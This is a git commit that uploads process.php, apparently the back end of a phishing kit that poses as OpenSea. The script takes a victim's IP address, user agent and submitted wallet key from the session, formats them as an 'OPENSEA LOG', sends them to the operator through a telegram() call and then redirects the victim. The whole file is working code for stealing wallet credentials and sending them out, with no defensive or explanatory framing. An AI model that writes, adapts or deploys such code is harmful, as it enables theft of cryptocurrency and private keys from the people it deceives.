408fdefc8b0c205667848ab8856bb5e2b037dfb0
silvanuss <103927924+silvanuss@users.noreply.github.com>
2022-09-01 15:34:19 +0700

    Add files via upload

---
+++ process.php
@@ -0,0 +1,24 @@
+<?php
+error_reporting(0);
+session_start();
+include_once 'index.php';
+include_once 'functions.php';
+include_once 'telegram.php';
+
+$fsh =
+        "<strong>‼️⛵️ OPENSEA LOG ⛵️‼️</strong>\n".
+		"<strong></strong>\n".
+        "<strong>🌐 IP:  ".$_SESSION['remote_ip']."</strong>\n".
+		"<i>📱 OS:  ".$_SESSION['useragent']."</i>\n".
+		"<strong></strong>\n".
+        "<strong>Key:</strong>\n".
+		"<code>".$_SESSION['key']."</code>\n".
+		"<strong></strong>\n".
+		"<strong>📟 Other wallet 📟</strong>\n"
+        ;
+
+telegram($fsh);
+finish($fsh);
+encrypt($fsh);
+header("Location: ./ ");
+?>
